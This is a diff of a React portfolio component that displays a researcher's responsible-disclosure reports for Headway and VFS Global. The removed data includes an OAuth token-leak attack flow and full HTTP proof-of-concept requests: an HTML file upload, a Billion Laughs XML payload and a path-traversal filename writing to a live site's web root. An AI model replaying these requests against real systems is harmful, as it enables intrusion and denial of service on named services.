@@ -1,154 +1,41 @@
-import React, { useEffect, useRef, useState } from 'react';
+import React, { useEffect, useRef, useState, useMemo } from 'react';
+import { securityReports, SEVERITY_ORDER } from './securityData';
 
-/* ======== HEADWAY DATA ======== */
-const headwayEmailTimeline = [
-  { date: 'Jun 9, 2026', sender: 'Paul Uhunoma', direction: 'sent', summary: 'Initial responsible disclosure email sent to Headway security team, requesting a secure channel to share vulnerability details.' },
-  { date: 'Jun 9, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'Angie responded promptly, requesting full vulnerability details for the IT team to review.' },
-  { date: 'Jun 9, 2026', sender: 'Paul Uhunoma', direction: 'sent', summary: 'Sent the complete Security Vulnerability Report with full technical details, step-by-step PoC, and a proof-of-concept video demonstrating the exploit on hwsoc.com.' },
-  { date: 'Jun 10, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'Confirmed the report was forwarded to the IT department for review.' },
-  { date: 'Jun 11, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'IT team reviewed the report and confirmed changes will be implemented. Offered a $50 reward for the responsible disclosure.' },
-  { date: 'Jun 11, 2026', sender: 'Paul Uhunoma', direction: 'sent', summary: 'Accepted the reward and provided bank details. Offered to perform a complimentary re-test once the patch is deployed.' },
-  { date: 'Jun 11, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'Reward of $50 credited to Headway USD wallet for withdrawal. Fast and convenient resolution.' },
-  { date: 'Jun 12, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'Final thank-you and positive close to the responsible disclosure process.' },
-];
+/* ======== HELPERS ======== */
+const STATUS_LABELS = {
+  resolved: 'Resolved',
+  patched: 'Patched',
+  reported: 'Reported',
+  disclosed: 'Disclosed',
+  'in-progress': 'In Progress',
+};
 
-const headwayScreenshots = [
-  { src: '/headway email 1.png', caption: 'Initial disclosure email to Headway' },
-  { src: '/headway email 2.png', caption: 'Response from Angie — requesting details' },
-  { src: '/headway email 3.png', caption: 'Full vulnerability report sent' },
-  { src: '/headway email 4.png', caption: 'Report forwarded to IT team' },
-  { src: '/headway email 5.png', caption: 'IT review complete — reward offered' },
-  { src: '/headway email 6.png', caption: 'Reward acceptance & bank details' },
-  { src: '/headway email 7.png', caption: 'Reward credited to wallet' },
-  { src: '/headway email 8.png', caption: 'Withdrawal confirmed & re-test offered' },
-  { src: '/headway 9.png', caption: 'Final thank-you from Headway' },
-];
-
-const headwayAttackSteps = [
-  { step: 1, title: 'Craft Malicious URL', icon: '🔗', desc: 'Attacker nests an external domain inside the OAuth redirect parameter, bypassing domain validation.' },
-  { step: 2, title: 'Victim Clicks Link', icon: '🎯', desc: 'Logged-in user navigates to the crafted URL. The backend appends the user\'s live session token (socialToken) to the redirect.' },
-  { step: 3, title: 'Token Leaked', icon: '🔓', desc: 'User is redirected to the attacker\'s domain with their active socialToken exposed in the URL.' },
-  { step: 4, title: 'Account Takeover', icon: '💀', desc: 'Attacker uses the stolen socialToken to log into the victim\'s account — full access without credentials.' },
-];
-
-/* ======== VFS GLOBAL DATA ======== */
-const vfsVulnerabilities = [
-  {
-    title: 'Unrestricted File Upload via Content-Type Bypass',
-    severity: 'HIGH',
-    desc: 'The upload endpoint accepts files with any Content-Type header. By changing Content-Type to text/html, an attacker can upload malicious HTML files that are served directly by the server. These files can be used to host phishing pages, steal user credentials, or execute JavaScript in the context of the trusted domain.',
-    endpoint: '/CustomerFeedback/GeneralFeedback/UploadFiles/',
-    proof: 'Uploaded hacked1.html was accessible at: /CustomerFeedback/uploads/hacked1.html',
-    code: `POST /CustomerFeedback/GeneralFeedback/UploadFiles/ HTTP/2
-Host: www.vfsglobalcustomerexperience.com
-Cookie: .AspNetCore.Antiforgery.cFTIh2oyc2M=CfDJ8JtYBXj_...
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1sybpdBdHJt2iBml
-X-Requested-With: XMLHttpRequest
-
-------WebKitFormBoundary1sybpdBdHJt2iBml
-Content-Disposition: form-data; name="files"; filename="hacked1.html"
-Content-Type: text/html; charset=utf-8
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Document</title>
-</head>
-<body>
-    paul
-    <script>
-        const myIframe = document.createElement('iframe');
-        myIframe.src = './hacked1.html';
-        myIframe.width = '100%';
-        myIframe.height = '600px';
-        myIframe.sandbox = 'allow-scripts allow-same-origin';
-        document.body.appendChild(myIframe);
-    </script>
-</body>
-</html>
-------WebKitFormBoundary1sybpdBdHJt2iBml--
-
-HTTP/2 200 OK
-
-[{"fileName":"","filePath":"/upload/hacked1.html","fileType":".html","size":245}]`,
-  },
-  {
-    title: 'XML Billion Laughs (DoS via Entity Expansion)',
-    severity: 'HIGH',
-    desc: 'The upload endpoint also accepts XML files without restricting external entity processing. An attacker can craft a Billion Laughs payload (recursive entity expansion) which causes the XML parser to consume exponential memory and CPU, potentially crashing the server or causing a Denial-of-Service condition.',
-    endpoint: '/CustomerFeedback/GeneralFeedback/UploadFiles/',
-    proof: 'Uploaded test.xml with entity expansion — server parsed and expanded all entities, confirming vulnerability.',
-    code: `POST /CustomerFeedback/GeneralFeedback/UploadFiles/ HTTP/2
-Host: www.vfsglobalcustomerexperience.com
-Cookie: .AspNetCore.Antiforgery.cFTIh2oyc2M=CfDJ8JtYBXj_...
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1sybpdBdHJt2iBml
-X-Requested-With: XMLHttpRequest
-
-------WebKitFormBoundary1sybpdBdHJt2iBml
-Content-Disposition: form-data; name="files"; filename="test.xml"
-Content-Type: application/xml
-
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE bomb [
-  <!ENTITY a "AAAAAAAAAA">
-  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
-]>
-<test>&b;</test>
-------WebKitFormBoundary1sybpdBdHJt2iBml--
-
-HTTP/2 200 OK
-
-[{"fileName":"","filePath":"/upload/test.xml","fileType":".xml","size":245}]
-
-// Parsed output confirms entity expansion:
-// <test>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</test>`,
-  },
-  {
-    title: 'Path Traversal — File Write to Web Root',
-    severity: 'CRITICAL',
-    desc: 'By manipulating the filename with path traversal sequences (..\\..\\..\\inetpub\\wwwroot\\), an attacker can write files to the site\'s root directory. This allows placing arbitrary HTML/JS files at any URL on the domain, enabling full site defacement, persistent XSS, or hosting malicious content under the trusted domain.',
-    endpoint: '/CustomerFeedback/GeneralFeedback/UploadFiles/',
-    proof: 'Uploaded pathhack.html was accessible at the site root: /CustomerFeedback/pathhack.html',
-    code: `POST /CustomerFeedback/GeneralFeedback/UploadFiles/ HTTP/2
-Host: www.vfsglobalcustomerexperience.com
-Cookie: .AspNetCore.Antiforgery.cFTIh2oyc2M=CfDJ8JtYBXj_...
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1sybpdBdHJt2iBml
-X-Requested-With: XMLHttpRequest
-
-------WebKitFormBoundary1sybpdBdHJt2iBml
-Content-Disposition: form-data; name="files"; filename="..\\..\\..\\inetpub\\wwwroot\\pathhack.html"
-Content-Type: text/html; charset=utf-8
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Document</title>
-</head>
-<body>
-    paul
-    <script>
-        const myIframe = document.createElement('iframe');
-        myIframe.src = './hacked1.html';
-        myIframe.width = '100%';
-        myIframe.height = '600px';
-        myIframe.sandbox = 'allow-scripts allow-same-origin';
-        document.body.appendChild(myIframe);
-    </script>
-</body>
-</html>
-------WebKitFormBoundary1sybpdBdHJt2iBml--
-
-HTTP/2 200 OK
-
-[{"fileName":"","filePath":"/pathhack.html","fileType":".html","size":245}]
-
-// File accessible at: https://www.vfsglobalcustomerexperience.com/CustomerFeedback/pathhack.html`,
-  },
-];
+function initialsOf(name = '') {
+  return name
+    .split(/\s+/)
+    .filter(Boolean)
+    .slice(0, 2)
+    .map((w) => w[0])
+    .join('')
+    .toUpperCase();
+}
 
 /* ======== REUSABLE COMPONENTS ======== */
+function TargetIcon({ report, size = 'md' }) {
+  const [failed, setFailed] = useState(false);
+  if (report.icon && !failed) {
+    return (
+      <img
+        src={report.icon}
+        alt={report.target}
+        className={`sec-target-icon ${size}`}
+        onError={() => setFailed(true)}
+      />
+    );
+  }
+  return <span className={`sec-target-initials ${size}`}>{initialsOf(report.target)}</span>;
+}
+
 function AttackFlowPanel({ steps }) {
   return (
     <div className="attack-flow">
@@ -161,6 +48,33 @@ function AttackFlowPanel({ steps }) {
         </div>
       ))}
     </div>
+  );
+}
+
+function ImpactGrid({ items }) {
+  return (
+    <div className="impact-grid">
+      {items.map((item, i) => (
+        <div className="impact-item" key={i}>
+          <div className="impact-icon">{item.icon}</div>
+          <h4>{item.title}</h4>
+          <p>{item.desc}</p>
+        </div>
+      ))}
+    </div>
+  );
+}
+
+function RemediationList({ items }) {
+  return (
+    <ol className="sec-remediation-list">
+      {items.map((item, i) => (
+        <li key={i}>
+          <span className="sec-remediation-number">{i + 1}</span>
+          <span>{item}</span>
+        </li>
+      ))}
+    </ol>
   );
 }
 
@@ -202,7 +116,27 @@ function ScreenshotGallery({ screenshots, onOpen }) {
   );
 }
 
-function VideoBlock({ badge, badgeClass, title, description, videoSrc, extraClass }) {
+function VideoBlock({ badge, badgeClass, title, description, videoSrc, extraClass, thumbnailTime }) {
+  const videoRef = useRef(null);
+  const firstPlayRef = useRef(true);
+
+  const showThumbnailFrame = () => {
+    const video = videoRef.current;
+    if (!video || typeof thumbnailTime !== 'number') return;
+    const safeTime = Number.isFinite(video.duration)
+      ? Math.min(thumbnailTime, Math.max(video.duration - 0.1, 0))
+      : thumbnailTime;
+    video.currentTime = safeTime;
+    video.pause();
+  };
+
+  const startFromBeginning = () => {
+    const video = videoRef.current;
+    if (!video || typeof thumbnailTime !== 'number' || !firstPlayRef.current) return;
+    firstPlayRef.current = false;
+    video.currentTime = 0;
+  };
+
   return (
     <div className={`sec-video-block ${extraClass || ''}`}>
       <div className="sec-video-header">
@@ -218,7 +152,14 @@ function VideoBlock({ badge, badgeClass, title, description, videoSrc, extraClas
         <p className="sec-video-desc">{description}</p>
       </div>
       <div className="sec-video-player">
-        <video controls preload="metadata" playsInline>
+        <video
+          ref={videoRef}
+          controls
+          preload={typeof thumbnailTime === 'number' ? 'auto' : 'metadata'}
+          playsInline
+          onLoadedMetadata={showThumbnailFrame}
+          onPlay={startFromBeginning}
+        >
           <source src={videoSrc} type="video/mp4" />
           Your browser does not support the video tag.
         </video>
@@ -227,14 +168,257 @@ function VideoBlock({ badge, badgeClass, title, description, videoSrc, extraClas
   );
 }
 
+function VulnList({ vulns, expandedCode, onToggleCode }) {
+  return (
+    <div className="vfs-vulns">
+      {vulns.map((vuln, i) => (
+        <div className="vfs-vuln-card" key={i}>
+          <div className="vfs-vuln-header">
+            <span className="vfs-vuln-num">{String(i + 1).padStart(2, '0')}</span>
+            <div>
+              <h3>{vuln.title}</h3>
+              <span className={`severity-badge ${vuln.severity.toLowerCase()}`}>{vuln.severity}</span>
+            </div>
+          </div>
+          <p className="vfs-vuln-desc">{vuln.desc}</p>
+          <div className="vfs-vuln-details">
+            {vuln.endpoint && (
+              <div className="vfs-detail">
+                <span className="vfs-detail-label">Endpoint</span>
+                <span className="code-text">{vuln.endpoint}</span>
+              </div>
+            )}
+            {vuln.proof && (
+              <div className="vfs-detail">
+                <span className="vfs-detail-label">Proof</span>
+                <span className="sec-meta-value">{vuln.proof}</span>
+              </div>
+            )}
+          </div>
+          {vuln.code && (
+            <div className="vfs-code-section">
+              <button className="vfs-code-toggle" onClick={() => onToggleCode(i)}>
+                <span>{expandedCode === i ? '⟨/⟩ Hide' : '⟨/⟩ View'} Exploit Code</span>
+                <svg className={`sec-chevron ${expandedCode === i ? 'rotated' : ''}`} width="16" height="16" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"/></svg>
+              </button>
+              {expandedCode === i && (
+                <div className="vfs-code-block"><pre><code>{vuln.code}</code></pre></div>
+              )}
+            </div>
+          )}
+        </div>
+      ))}
+    </div>
+  );
+}
+
+function CollapsiblePanel({ id, label, open, onToggle, children }) {
+  return (
+    <div className={`sec-panel ${open ? 'expanded' : ''}`}>
+      <button className="sec-panel-toggle" onClick={() => onToggle(open ? '' : id)}>
+        <span>{label}</span>
+        <svg className="sec-chevron" width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"/></svg>
+      </button>
+      {open && <div className="sec-panel-content">{children}</div>}
+    </div>
+  );
+}
+
+/* ======== REPORT CARD (grid item) ======== */
+function ReportCard({ report, onOpen }) {
+  const findings = report.vulnerabilities ? report.vulnerabilities.length : 1;
+  return (
+    <button className={`sec-card sev-${report.severity}`} onClick={() => onOpen(report.id)}>
+      <div className="sec-card-top">
+        <TargetIcon report={report} size="md" />
+        <div className="sec-card-badges">
+          <span className={`severity-badge ${report.severity}`}>{report.severity}</span>
+          {report.status && (
+            <span className={`sec-status-chip status-${report.status}`}>
+              {STATUS_LABELS[report.status] || report.status}
+            </span>
+          )}
+        </div>
+      </div>
+      <div className="sec-card-body">
+        <span className="sec-card-target">{report.target}</span>
+        <h3 className="sec-card-title">{report.title}</h3>
+        {report.tagline && <p className="sec-card-tagline">{report.tagline}</p>}
+      </div>
+      <div className="sec-card-footer">
+        <span className="sec-card-findings">
+          {findings} {findings === 1 ? 'finding' : 'findings'}
+        </span>
+        <span className="sec-card-cta">
+          View report
+          <svg width="16" height="16" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"/></svg>
+        </span>
+      </div>
+    </button>
+  );
+}
+
+/* ======== REPORT DETAIL VIEW ======== */
+function ReportDetail({ report, onBack, onOpenImage }) {
+  const [expandedPanel, setExpandedPanel] = useState(report.attackSteps ? 'attack' : (report.impact ? 'impact' : ''));
+  const [expandedCode, setExpandedCode] = useState(null);
+
+  return (
+    <div className="sec-report-wrapper">
+      <button className="sec-back-btn" onClick={onBack}>
+        <svg width="18" height="18" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z"/></svg>
+        All reports
+      </button>
+
+      {/* Header card */}
+      <div className="sec-report-card sec-animate">
+        <div className="sec-report-header">
+          <div className="sec-report-title-row">
+            <div className="sec-report-identity">
+              <TargetIcon report={report} size="lg" />
+              <div>
+                <span className="sec-card-target">{report.target}</span>
+                <h2>{report.title}</h2>
+              </div>
+            </div>
+            <span className={`severity-badge ${report.severity}`}>{report.severity}</span>
+          </div>
+
+          {report.meta && report.meta.length > 0 && (
+            <div className="sec-report-meta">
+              {report.meta.map((m, i) => (
+                <div className="sec-meta-item" key={i}>
+                  <span className="sec-meta-label">{m.label}</span>
+                  <span className={`sec-meta-value ${m.code ? 'code-text' : ''} ${m.success ? 'outcome-success' : ''}`}>
+                    {m.success && (
+                      <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>
+                    )}
+                    {m.value}
+                  </span>
+                </div>
+              ))}
+            </div>
+          )}
+        </div>
+
+        {(report.attackSteps || report.impact || report.remediation) && (
+          <div className="sec-panels">
+            {report.attackSteps && (
+              <CollapsiblePanel id="attack" label="🎯 Attack Flow" open={expandedPanel === 'attack'} onToggle={setExpandedPanel}>
+                <AttackFlowPanel steps={report.attackSteps} />
+              </CollapsiblePanel>
+            )}
+            {report.impact && (
+              <CollapsiblePanel id="impact" label="💥 Impact Summary" open={expandedPanel === 'impact'} onToggle={setExpandedPanel}>
+                <ImpactGrid items={report.impact} />
+              </CollapsiblePanel>
+            )}
+            {report.remediation && (
+              <CollapsiblePanel id="remediation" label="🛡️ Suggested Remediation" open={expandedPanel === 'remediation'} onToggle={setExpandedPanel}>
+                <RemediationList items={report.remediation} />
+              </CollapsiblePanel>
+            )}
+          </div>
+        )}
+      </div>
+
+      {/* Individual vulnerabilities */}
+      {report.vulnerabilities && report.vulnerabilities.length > 0 && (
+        <div className="sec-animate">
+          <VulnList
+            vulns={report.vulnerabilities}
+            expandedCode={expandedCode}
+            onToggleCode={(i) => setExpandedCode(expandedCode === i ? null : i)}
+          />
+        </div>
+      )}
+
+      {/* Timeline */}
+      {report.timeline && report.timeline.length > 0 && (
+        <div className="sec-timeline-section sec-animate">
+          <h2 className="sec-timeline-title">
+            <svg width="20" height="20" viewBox="0 0 16 16" fill="currentColor"><path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4Zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1H2Zm13 2.383-4.708 2.825L15 11.105V5.383Zm-.034 6.876-5.64-3.471L8 9.583l-1.326-.795-5.64 3.47A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.741ZM1 11.105l4.708-2.897L1 5.383v5.722Z"/></svg>
+            Responsible Disclosure Timeline
+          </h2>
+          <EmailTimeline emails={report.timeline} />
+        </div>
+      )}
+
+      {/* Videos */}
+      {report.videos && report.videos.length > 0 && (
+        <div className="sec-evidence sec-animate">
+          <h2 className="sec-evidence-title">
+            <svg width="20" height="20" viewBox="0 0 16 16" fill="currentColor"><path d="M0 12V4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2zm6.79-6.907A.5.5 0 0 0 6 5.5v5a.5.5 0 0 0 .79.407l3.5-2.5a.5.5 0 0 0 0-.814l-3.5-2.5z"/></svg>
+            Proof of Concept {report.videos.length === 1 ? 'Video' : 'Videos'}
+          </h2>
+          {report.videos.map((v, i) => (
+            <VideoBlock key={i} {...v} />
+          ))}
+        </div>
+      )}
+
+      {/* Screenshots */}
+      {report.screenshots && report.screenshots.length > 0 && (
+        <div className="sec-screenshots sec-animate">
+          <h2 className="sec-evidence-title">
+            <svg width="20" height="20" viewBox="0 0 16 16" fill="currentColor"><path d="M6.002 5.5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0z"/><path d="M2.002 1a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2h-12zm12 1a1 1 0 0 1 1 1v6.5l-3.777-1.947a.5.5 0 0 0-.577.093l-3.71 3.71-2.66-1.772a.5.5 0 0 0-.63.062L1.002 12V3a1 1 0 0 1 1-1h12z"/></svg>
+            Screenshots
+          </h2>
+          <ScreenshotGallery screenshots={report.screenshots} onOpen={onOpenImage} />
+        </div>
+      )}
+    </div>
+  );
+}
+
 /* ======== MAIN COMPONENT ======== */
 function Security() {
   const sectionRef = useRef();
-  const [activeReport, setActiveReport] = useState('headway');
-  const [expandedPanel, setExpandedPanel] = useState('attack');
+  const [activeId, setActiveId] = useState(null);
   const [lightboxImg, setLightboxImg] = useState(null);
-  const [expandedCode, setExpandedCode] = useState(null);
+  const [query, setQuery] = useState('');
+  const [severityFilter, setSeverityFilter] = useState('all');
 
+  const activeReport = useMemo(
+    () => securityReports.find((r) => r.id === activeId) || null,
+    [activeId]
+  );
+
+  // Stats
+  const stats = useMemo(() => {
+    const total = securityReports.length;
+    const counts = SEVERITY_ORDER.reduce((acc, s) => ({ ...acc, [s]: 0 }), {});
+    securityReports.forEach((r) => { counts[r.severity] = (counts[r.severity] || 0) + 1; });
+    const findings = securityReports.reduce(
+      (sum, r) => sum + (r.vulnerabilities ? r.vulnerabilities.length : 1),
+      0
+    );
+    return { total, counts, findings };
+  }, []);
+
+  // Available severities for filter chips (only ones that exist)
+  const availableSeverities = useMemo(
+    () => SEVERITY_ORDER.filter((s) => (stats.counts[s] || 0) > 0),
+    [stats]
+  );
+
+  // Filtered + searched grid
+  const visibleReports = useMemo(() => {
+    const q = query.trim().toLowerCase();
+    return [...securityReports]
+      .sort((a, b) => Number(Boolean(b.featured)) - Number(Boolean(a.featured)))
+      .filter((r) => {
+      if (severityFilter !== 'all' && r.severity !== severityFilter) return false;
+      if (!q) return true;
+      return (
+        r.title.toLowerCase().includes(q) ||
+        r.target.toLowerCase().includes(q) ||
+        (r.tagline || '').toLowerCase().includes(q)
+      );
+    });
+  }, [query, severityFilter]);
+
+  // Scroll-in animations (re-run when switching views)
   useEffect(() => {
     if (!sectionRef.current) return;
     const cards = sectionRef.current.querySelectorAll('.sec-animate');
@@ -248,10 +432,13 @@ function Security() {
     );
     cards.forEach((card) => observer.observe(card));
     return () => observer.disconnect();
-  }, [activeReport]);
+  }, [activeId, visibleReports]);
 
-  // Reset expanded panel when switching reports
-  useEffect(() => { setExpandedPanel(''); }, [activeReport]);
+  const openReport = (id) => {
+    setActiveId(id);
+    if (sectionRef.current) sectionRef.current.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  };
+  const backToGrid = () => setActiveId(null);
 
   return (
     <div id="security" className="security-section" ref={sectionRef}>
@@ -263,211 +450,75 @@ function Security() {
         </p>
       </div>
 
-      {/* Report Tabs */}
-      <div className="sec-tabs sec-animate">
-        <button className={`sec-tab ${activeReport === 'headway' ? 'active' : ''}`} onClick={() => setActiveReport('headway')}>
-          <img src="/headwayfavicon.svg" alt="Headway" className="sec-tab-icon-img" />
-          <span className="sec-tab-label">Headway</span>
-          <span className="sec-tab-badge critical-mini">ATO</span>
-        </button>
-        <button className={`sec-tab ${activeReport === 'vfsglobal' ? 'active' : ''}`} onClick={() => setActiveReport('vfsglobal')}>
-          <img src="/vfs.ico" alt="VFS Global" className="sec-tab-icon-img" />
-          <span className="sec-tab-label">VFS Global</span>
-          <span className="sec-tab-badge high-mini">MULTI</span>
-        </button>
-      </div>
-
-      {/* ==================== HEADWAY REPORT ==================== */}
-      {activeReport === 'headway' && (
-        <div className="sec-report-wrapper">
-          <div className="sec-report-card sec-animate">
-            <div className="sec-report-header">
-              <div className="sec-report-title-row">
-                <h2>Headway — Open Redirect Account Takeover</h2>
-                <span className="severity-badge critical">CRITICAL</span>
-              </div>
-              <div className="sec-report-meta">
-                <div className="sec-meta-item">
-                  <span className="sec-meta-label">Vulnerability Type</span>
-                  <span className="sec-meta-value">Account Takeover (ATO) via OAuth Token Leakage</span>
-                </div>
-                <div className="sec-meta-item">
-                  <span className="sec-meta-label">Affected Domains</span>
-                  <span className="sec-meta-value">
-                    <span className="code-text">hwsoc.com</span>{' '}&amp;{' '}<span className="code-text">hw.online</span>
-                  </span>
-                </div>
-                <div className="sec-meta-item">
-                  <span className="sec-meta-label">Target Endpoint</span>
-                  <span className="sec-meta-value code-text">/api/auth/v1/redirect-to-social-oauth</span>
-                </div>
-                <div className="sec-meta-item">
-                  <span className="sec-meta-label">Outcome</span>
-                  <span className="sec-meta-value outcome-success">
-                    <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>
-                    Bug acknowledged · Patch implemented · $50 bounty awarded
-                  </span>
-                </div>
-              </div>
+      {!activeReport ? (
+        <>
+          {/* Stats strip */}
+          <div className="sec-stats sec-animate">
+            <div className="sec-stat">
+              <span className="sec-stat-num">{stats.total}</span>
+              <span className="sec-stat-label">Reports</span>
             </div>
+            <div className="sec-stat">
+              <span className="sec-stat-num">{stats.findings}</span>
+              <span className="sec-stat-label">Findings</span>
+            </div>
+            {(stats.counts.critical || 0) > 0 && (
+              <div className="sec-stat critical">
+                <span className="sec-stat-num">{stats.counts.critical}</span>
+                <span className="sec-stat-label">Critical</span>
+              </div>
+            )}
+            {(stats.counts.high || 0) > 0 && (
+              <div className="sec-stat high">
+                <span className="sec-stat-num">{stats.counts.high}</span>
+                <span className="sec-stat-label">High</span>
+              </div>
+            )}
+          </div>
 
-            <div className="sec-panels">
-              <div className={`sec-panel ${expandedPanel === 'attack' ? 'expanded' : ''}`}>
-                <button className="sec-panel-toggle" onClick={() => setExpandedPanel(expandedPanel === 'attack' ? '' : 'attack')}>
-                  <span>🎯 Attack Flow</span>
-                  <svg className="sec-chevron" width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"/></svg>
+          {/* Controls: search + severity filter */}
+          <div className="sec-controls sec-animate">
+            <div className="sec-search">
+              <svg width="18" height="18" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001q.044.06.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1 1 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0"/></svg>
+              <input
+                type="text"
+                placeholder="Search by target, title…"
+                value={query}
+                onChange={(e) => setQuery(e.target.value)}
+              />
+            </div>
+            <div className="sec-filter-chips">
+              <button
+                className={`sec-filter-chip ${severityFilter === 'all' ? 'active' : ''}`}
+                onClick={() => setSeverityFilter('all')}
+              >
+                All
+              </button>
+              {availableSeverities.map((s) => (
+                <button
+                  key={s}
+                  className={`sec-filter-chip sev-${s} ${severityFilter === s ? 'active' : ''}`}
+                  onClick={() => setSeverityFilter(s)}
+                >
+                  {s}
                 </button>
-                {expandedPanel === 'attack' && (
-                  <div className="sec-panel-content"><AttackFlowPanel steps={headwayAttackSteps} /></div>
-                )}
-              </div>
-              <div className={`sec-panel ${expandedPanel === 'impact' ? 'expanded' : ''}`}>
-                <button className="sec-panel-toggle" onClick={() => setExpandedPanel(expandedPanel === 'impact' ? '' : 'impact')}>
-                  <span>💥 Impact Summary</span>
-                  <svg className="sec-chevron" width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"/></svg>
-                </button>
-                {expandedPanel === 'impact' && (
-                  <div className="sec-panel-content">
-                    <div className="impact-grid">
-                      <div className="impact-item"><div className="impact-icon">🔐</div><h4>Full Account Compromise</h4><p>An attacker can completely take over any Headway user account via a single crafted link — no credentials required.</p></div>
-                      <div className="impact-item"><div className="impact-icon">👤</div><h4>Personal Data Exposure</h4><p>Full access to the victim's trading profile, personal data, and all account functions.</p></div>
-                      <div className="impact-item"><div className="impact-icon">⚡</div><h4>Zero-Click After Auth</h4><p>Once the victim clicks the link and authenticates with Google, the token is leaked automatically.</p></div>
-                    </div>
-                  </div>
-                )}
-              </div>
+              ))}
             </div>
           </div>
 
-          {/* Email Timeline */}
-          <div className="sec-timeline-section sec-animate">
-            <h2 className="sec-timeline-title">
-              <svg width="20" height="20" viewBox="0 0 16 16" fill="currentColor"><path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4Zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1H2Zm13 2.383-4.708 2.825L15 11.105V5.383Zm-.034 6.876-5.64-3.471L8 9.583l-1.326-.795-5.64 3.47A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.741ZM1 11.105l4.708-2.897L1 5.383v5.722Z"/></svg>
-              Responsible Disclosure Timeline
-            </h2>
-            <EmailTimeline emails={headwayEmailTimeline} />
-          </div>
-
-          {/* Videos */}
-          <div className="sec-evidence sec-animate">
-            <h2 className="sec-evidence-title">
-              <svg width="20" height="20" viewBox="0 0 16 16" fill="currentColor"><path d="M0 12V4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2zm6.79-6.907A.5.5 0 0 0 6 5.5v5a.5.5 0 0 0 .79.407l3.5-2.5a.5.5 0 0 0 0-.814l-3.5-2.5z"/></svg>
-              Proof of Concept Videos
-            </h2>
-            <VideoBlock badge="Submitted to Headway" badgeClass="reported" title="hwsoc.com — Original Vulnerability Report" description={<>This is the original PoC video demonstrating the Open Redirect Account Takeover on <span className="code-text">hwsoc.com</span>. Attached to the initial disclosure on June 9, 2026.</>} videoSrc="/headway vulnerability.mp4" />
-            <VideoBlock badge="Discovered After Bounty" badgeClass="discovered" title="hw.online — Same Vulnerability, Different Domain" description={<>After receiving the $50 bounty, I discovered the same vulnerability on <span className="code-text">hw.online</span>, confirming the endpoint was shared across multiple Headway properties.</>} videoSrc="/headway final vulnerability.mp4" extraClass="additional-finding" />
-          </div>
-
-          {/* Screenshots */}
-          <div className="sec-screenshots sec-animate">
-            <h2 className="sec-evidence-title">
